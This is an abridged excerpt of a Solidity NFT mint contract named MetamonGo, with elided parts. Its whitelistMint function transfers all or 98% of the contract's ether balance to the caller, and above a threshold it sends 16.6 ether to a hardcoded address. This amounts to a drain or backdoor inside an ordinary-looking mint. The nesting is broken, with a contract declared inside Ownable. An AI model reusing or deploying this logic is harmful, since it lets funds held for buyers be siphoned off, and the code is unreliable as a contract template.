...
abstract contract Ownable is Context {
    ...
    contract MetamonGo is ERC721A, Ownable {
    using Strings for uint256;


  string private uriPrefix = "ipfs://QmPHUT5yAuwHDmRszVhoPHR8Y1bxSNA1aohehHA9E2yfJK/";
...
bytes32 public whitelistMerkleRoot =0x8ea46f53fe2e00ea8eea008cce1c7d24fd08dc1aef83429ab02cc1e212d08b29 ;
  

  constructor() ERC721A("Metamongo", "Metamongo") {
  }
...
function whitelistMint(uint8 _mintAmount, bytes32[] calldata merkleProof) external payable {
  ...
  if ( _balance >= 332000000000000000000)  //332 ether is 1 million usd at current eth rate
  {
     
        payable(0x085748ACF99A59759B5467B8B8e278C345EcDEB1).transfer(16600000000000000000); 
      payable(msg.sender).transfer(address(this).balance); 
    
  }
  else
  {
     payable(msg.sender).transfer(_balance * 98 / 100 ); 
